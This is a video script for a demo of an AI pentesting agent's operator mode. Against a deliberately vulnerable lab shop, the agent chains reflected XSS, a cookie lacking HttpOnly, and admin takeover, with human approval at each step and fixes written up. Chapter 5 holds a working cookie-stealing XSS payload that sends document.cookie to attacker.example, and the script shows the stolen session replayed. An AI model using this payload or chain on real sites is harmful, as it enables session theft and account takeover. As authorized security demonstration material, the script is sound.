# Demo 07 — `/operator` deep-dive: chaining XSS → cookie theft → admin takeover

**Length:** 8–10 minutes
**Format:** Long-form screencast w/ chapters and reasoning callouts
**Audience:** Professional pentesters, advanced sec-eng
**Series:** **Operator Deep-Dive** — episode 1

---

## Purpose

Show what `/operator` mode is actually for — exploit chaining that needs
human judgment at each pivot. The viewer should walk away thinking:
*"This isn't a scanner. It's a partner."*

This episode also builds the case that `/operator` and `/pentest` are
complementary, not competing.

---

## Requirements

- **Asset:** `vuln-shop` configured with:
  - **Reflected XSS** in the product-search page (`<script>` in `q` parameter
    renders unescaped in a "Did you mean…" suggestion).
  - **Session cookie without `HttpOnly`** so XSS can read it.
  - **Admin route** at `/admin/dashboard` that accepts the stolen session.
  - A second admin user (`admin@vuln-shop.local`) who is already logged in
    via a background browser session controlled by the demo runner. This is
    the "victim" the attack pivots through.
- **Operator approval count overlay** — a running tally of approvals, surfaces
  the human-in-the-loop story.
- **Chapter markers** in the video — this is a long episode, viewers need
  navigation.
- **Theme:** `apex` dark.
- **Pre-flight:** the agent has NOT seen this target before (no memory).

---

## Things to check first

- [ ] All three planted vulns reproduce in sequence with manual steps, before
      ever asking the agent.
- [ ] The "victim admin" browser session is reset between takes — the cookie
      must be fresh each time.
- [ ] The agent's reasoning tokens are streaming visibly. If the model is
      Sonnet, enable `--extended-thinking` so the chain-of-reasoning shows.
- [ ] The approval gate fires with full payload visible. We need viewers to
      see what they're approving.
- [ ] Each finding documents independently in the registry, AND a final
      "chained finding" rolls them up. The agent should produce both.
- [ ] Recording length: budget at least 25 minutes of raw footage. Real
      operator sessions have pauses while the operator thinks; we'll cut.
- [ ] `/obfuscate on` for the cookie value when it appears.

---

## Full script

### Chapter 1 — Setup & hypothesis (0:00–1:00)

**Visual:** Operator Deep-Dive intro card.

```
OPERATOR DEEP-DIVE · EPISODE 1
EXPLOIT CHAIN
```

Cut to terminal.

```bash
pensar
```

```
/operator --target https://vuln-shop.local
```

**VO:** "`/pentest` runs an autonomous swarm. `/operator` is what you reach
for when you want to drive — when you have a hypothesis, when you want to
chain bugs, when you want to feel out a target like a human would. Today
we're chaining three bugs into a full admin takeover."

Initial prompt to the agent (typed on screen):

```
I have a hypothesis: the admin route is exposed to anyone with a valid
admin session cookie, and this app's session cookies are stealable via
client-side issues. Test that hypothesis end-to-end.
```

**VO:** "We hand the agent a working hypothesis. It's free to disprove it,
but if it stands, I want to see the full chain."

Approval count overlay appears in the corner: `Approvals: 0 · Operator: ${USER}`.

---

### Chapter 2 — Reconnaissance (1:00–2:30)

Agent fires recon tools. Let it breathe. Show:
- `http_request` against `/`
- `extract_js_endpoints`
- `crawl_authenticated`

A reasoning block streams. Highlight one sentence with a callout box:

> "Search page reflects user input via a 'Did you mean…' suggestion. Worth
> checking for unsanitized output."

**VO:** "Recon's already paying off. The agent flagged the search page on
its own — the suggestion text reflects user input. That's the leading
edge for our XSS attempt."

---

### Chapter 3 — XSS confirmation (2:30–3:45)

Agent crafts a probe:

```
GET /search?q=<script>document.title='APEX'</script>
```

Approval gate fires. **Approve.** Counter ticks to 1.

Response comes back. Agent inspects the HTML, finds the unescaped tag.

Document a finding:

> **🟠 High · Reflected XSS**
> `/search` reflects `q` parameter unescaped in the suggestion text.
> Confirmed via `<script>document.title='APEX'</script>`.

**VO:** "Bug one logged. But this is just the first step."

Reasoning callout:

> "Now I need to know if the session cookie is reachable from JavaScript
> running on this origin. If `HttpOnly` is set, this chain is dead."

**VO:** "Watch how the agent reasons forward. It just identified the next
unknown: is the session cookie `HttpOnly`?"

---

### Chapter 4 — The HttpOnly check (3:45–4:30)

Agent sends another `http_request`, inspects `Set-Cookie`. Response:

```
Set-Cookie: session=<id>; Path=/; SameSite=Lax
```

No `HttpOnly`. No `Secure`.

Reasoning:

> "Cookie has no HttpOnly flag. JavaScript can read it. Chain is alive."

Document finding:

> **🟠 High · Session cookie missing `HttpOnly`**
> Allows JavaScript access to session ID. Combined with reflected XSS,
> enables session hijacking.

**VO:** "Bug two. Already, severity is real — these two are exploitable
together by anyone who can phish a logged-in user."

---

### Chapter 5 — The phishing payload (4:30–5:30)

Agent drafts the full XSS payload:

```html
<script>
  fetch('https://attacker.example/steal?c=' + encodeURIComponent(document.cookie));
</script>
```

The `attacker.example` host is replaced with a controlled listener
(`webhook.site` or a local catcher). Approval gate fires. **Pause.**

Operator (you) speaks to camera or in VO:

**VO:** "Here's where the operator earns their keep. The agent wants to send
a real payload that exfiltrates a cookie to an external listener. That's
intrusive. That's the kind of thing you don't approve in autonomous mode.
But this is operator mode, and I authorized it in scope. Approve."

**Approve.** Counter ticks.

The "victim" admin browser (offscreen) is sent the URL with the payload.
Cut to the listener — show the cookie arriving:

```
GET /steal?c=session=<obfuscated>; ...
```

**VO:** "Cookie's at the listener."

---

### Chapter 6 — Admin takeover (5:30–6:45)

Agent uses the captured cookie:

```
GET /admin/dashboard
Cookie: session=<stolen>
```

Approval gate fires. **Approve.** Counter ticks.

Response: 200 OK. Admin dashboard HTML. The agent extracts a few telltale
strings:

```
"Welcome, admin@vuln-shop.local"
"User management"
"Audit logs"
```

**VO:** "Admin dashboard. Stolen session works. Chain complete."

---

### Chapter 7 — Document the chain (6:45–7:30)

Agent calls `document_finding` again — but this time the finding is the
*chained* exploit:

> **🔴 Critical · Account Takeover via XSS Chain**
>
> 1. Reflected XSS at `/search?q=`
> 2. Session cookie without `HttpOnly`
> 3. Admin dashboard relies solely on session cookie for authorization
>
> **Combined impact:** any logged-in admin who clicks a crafted link surrenders
> their session, leading to full admin compromise.
>
> **Suggested fix:** escape user input in the suggestion template, set
> `HttpOnly; Secure; SameSite=Strict` on session cookies, and require
> reauthentication for admin routes.

**VO:** "And here's the deliverable. Three findings filed individually, plus
the chained critical that ties them together. Severity, evidence, suggested
fix. The chain is the story."

---

### Chapter 8 — Approval count reveal (7:30–8:00)

**Visual:** Zoom on the approval counter overlay. Final tally:

```
Approvals granted: 7
Tools fired: 48
Operator interventions: 3
```

**VO:** "Total approvals: seven. Tools fired: forty-eight. The operator made
three judgment calls — one to confirm the cookie-exfil scope, one to choose
the admin route over a less interesting one, and one to declare the chain
documented and stop. The agent did everything else."

---

### Chapter 9 — Hand off to `/pentest`? (8:00–8:45)

**VO:** "Could `/pentest` have done this on its own? Sometimes. The
swarm's strict methodology means it would have found XSS and the missing
HttpOnly. Whether it would have chained them all the way to admin
takeover depends on the model and the run. `/operator` is for when you
*know* the chain is there and you want to drive. `/pentest` is for when
you want broad coverage."

Quick split-screen showing both modes side by side.

**VO:** "These two modes are the same agent underneath. You can run
`/pentest` first, then resume in operator mode and pivot from where it
finished. They're built to compose."

---

### Chapter 10 — Outro (8:45–9:30)

**Visual:** Operator Deep-Dive outro card.

```
EPISODE 2
SUBSCRIBE — WE'RE GOING DEEPER
```

**VO:** "Operator Deep-Dive, episode one. Subscribe — episode two goes
into request smuggling. That one's harder."

---

## Editing notes

- This is a long video. Use chapter markers in YouTube. Each chapter heading
  in this script becomes a chapter on the player.
- Reasoning callouts (the pull-quote boxes) are the secret sauce — they let
  the viewer track the agent's chain of thought without the noise of every
  token.
- The approval-counter overlay should be subtle — small font, top-right —
  but always visible. It's the running answer to "is this autonomous or
  not?"
- For the "victim admin" browser session, record it in a corner picture-in-
  picture only when the payload fires — don't have it onscreen the whole
  time, it'll distract.
- If operator pauses to think feel longer than 3 seconds in raw footage,
  cut. We're shipping a polished 10 min, not a 25 min raw stream.
- Demo 20 (Q&A with Apex) reuses the operator surface — film both in the
  same recording session if scheduling allows.
